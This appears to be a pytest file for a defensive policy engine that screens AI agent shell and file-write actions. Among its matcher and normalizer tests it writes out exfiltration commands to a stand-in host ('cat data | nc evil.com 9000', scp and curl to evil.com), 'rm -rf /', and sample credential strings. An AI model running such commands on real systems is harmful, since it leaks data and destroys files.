import pytest
import subprocess
import json
import os
import sys
from unittest.mock import patch, mock_open
from pydantic import ValidationError

from preflight.matchers import glob_match, entropy_hit, blocked, evaluate_match
from preflight.models import Policy, Rule, RegexMatch, GlobMatch, EntropyMatch, DomainAllowlistMatch, MaxSizeMatch
from preflight.engine import evaluate_action
from preflight.hooks import tool_to_action, handle_claude_code
from preflight.cli import load_policy
from preflight.normalizers import apply_normalizers

def test_glob_matcher():
    assert glob_match(".env", ".env")
    assert glob_match(".env", "config/.env")
    assert glob_match(".env", "./.env")
    assert glob_match(".env", "/home/u/app/.env")
    assert glob_match(".env", "../.env")
    assert glob_match(".env", ".ENV")
    assert glob_match(".env", ".env.production")
    assert glob_match(".github/workflows/*", "/repo/.github/workflows/ci.yml")
    assert glob_match("*.pem", "/absolute/path/key.pem")
    assert not glob_match(".env", "src/environment.py")
    assert not glob_match(".env", "myenv/app.py")

def test_entropy_matcher():
    assert not entropy_hit("def hello():\n    print('world')", threshold=4.2, min_len=32)
    assert not entropy_hit("This is just ordinary prose and shouldn't trigger.", threshold=4.2, min_len=32)
    assert not entropy_hit("https://github.com/org/repo/commit/1234567890", threshold=4.2, min_len=32)
    # 32+ char string with enough unique characters to hit >4.2 entropy
    assert entropy_hit("AKIAIOSFODNN7EXAMPLE" + "abcdefghijklmnopqrstuvwxyz123", threshold=4.2, min_len=32)
    assert entropy_hit("ghp_1234567890abcdefghijklmnopqrstuvwxyzABCD", threshold=4.2, min_len=32)

def test_network_matcher():
    allowed = ["github.com", "files.pythonhosted.org"]
    assert blocked("curl evil.com/x", allowed) == ["evil.com"]
    assert blocked("curl http://1.2.3.4/x", allowed) == ["1.2.3.4"]
    assert blocked("scp file.txt user@evil.com:/tmp", allowed) == ["evil.com"]
    assert blocked("cat data | nc evil.com 9000", allowed) == ["evil.com"]
    assert blocked("git clone git@evil.com:x/y.git", allowed) == ["evil.com"]
    assert blocked("ssh deploy@evil.com", allowed) == ["evil.com"]
    assert not blocked("curl -o out.json https://github.com/x", allowed)
    assert not blocked("curl -O https://files.pythonhosted.org/x.whl", allowed)
    assert not blocked("npm install express", allowed)

def test_invalid_regex_rejected_at_load():
    with pytest.raises(ValidationError):
        RegexMatch(kind="regex", field="command", pattern="[unclosed")

def test_model_field_validation():
    with pytest.raises(ValidationError):
        Rule(
            id="bad-rule",
            applies_to=["shell"],
            match=RegexMatch(kind="regex", field="content", pattern="test"),
            decision="deny",
            message="Test"
        )

def test_engine_long_input_cap():
    policy = Policy(rules=[])
    action = {"type": "shell", "command": "a" * 20001}
    result = evaluate_action(action, policy)
    assert result["decision"] == "warn"
    assert len(result["matched_rules"]) == 1
    assert result["matched_rules"][0]["id"] == "preflight.input-too-large"

    action_write = {"type": "write", "content": "a" * 1000001}
    result_write = evaluate_action(action_write, policy)
    assert result_write["decision"] == "warn"

def test_hooks_tool_to_action():
    assert tool_to_action("Bash", {"command": "ls"}) == {"type": "shell", "command": "ls"}
    assert tool_to_action("Write", {"file_path": "a.txt", "content": "hello"}) == {"type": "write", "path": "a.txt", "content": "hello"}
    assert tool_to_action("Edit", {"file_path": "a.txt", "new_string": "world"}) == {"type": "write", "path": "a.txt", "content": "world"}
    
    multi = {"file_path": "a.txt", "edits": [{"new_string": "a"}, {"new_string": "b"}]}
    assert tool_to_action("MultiEdit", multi) == {"type": "write", "path": "a.txt", "content": "a\nb"}
    assert tool_to_action("Unknown", {}) is None

def test_audit_log_no_secrets():
    from preflight.audit import write_audit_log
    
    action = {"type": "shell", "command": "echo AKIAIOSFODNN7EXAMPLEAKIAIOSFODNN7EXAMPL"}
    result = {
        "decision": "deny", 
        "matched_rules": [{"id": "aws-key", "decision": "deny", "message": "AWS key found"}],
        "normalized": False
    }
    
    # Patch the global open function to catch what gets written
    m = mock_open()
    with patch("builtins.open", m):
        write_audit_log(action, result)
        
    written_data = "".join(call.args[0] for call in m().write.call_args_list)
    assert "AKIAIOSFODNN7EXAMPLE" not in written_data

def test_cli_exit_codes_and_invalid_policy(tmp_path):
    bad_policy = tmp_path / "bad.yaml"
    bad_policy.write_text("invalid: yaml: [")
    
    with pytest.raises(SystemExit) as exc:
        load_policy(str(bad_policy), exit_code=65)
    assert exc.value.code == 65

def test_schema_up_to_date():
    schema = Policy.model_json_schema()
    assert "properties" in schema
    assert "rules" in schema["properties"]

def test_normalizers():
    assert apply_normalizers("hello  world", ["collapse_whitespace"]) == "hello world"
    assert apply_normalizers("hello\tworld\n", ["collapse_whitespace"]) == "hello world"
    assert apply_normalizers("'rm -rf /'", ["strip_shell_quotes"]) == "rm -rf /"

def test_precedence():
    policy = Policy(rules=[
        Rule(id="1", applies_to=["shell"], match=RegexMatch(kind="regex", field="command", pattern="warn"), decision="warn", message="w"),
        Rule(id="2", applies_to=["shell"], match=RegexMatch(kind="regex", field="command", pattern="deny"), decision="deny", message="d")
    ])
    
    res1 = evaluate_action({"type": "shell", "command": "warn"}, policy)
    assert res1["decision"] == "warn"
    
    res2 = evaluate_action({"type": "shell", "command": "warn deny"}, policy)
    assert res2["decision"] == "deny"

def test_evaluate_match_functions():
    assert evaluate_match(RegexMatch(kind="regex", field="command", pattern="test"), "this is a test")
    assert not evaluate_match(RegexMatch(kind="regex", field="command", pattern="test"), "this is a text")
    assert evaluate_match(MaxSizeMatch(kind="max_size", field="content", max_lines=2), "1\n2\n3")
    assert not evaluate_match(MaxSizeMatch(kind="max_size", field="content", max_lines=5), "1\n2\n3")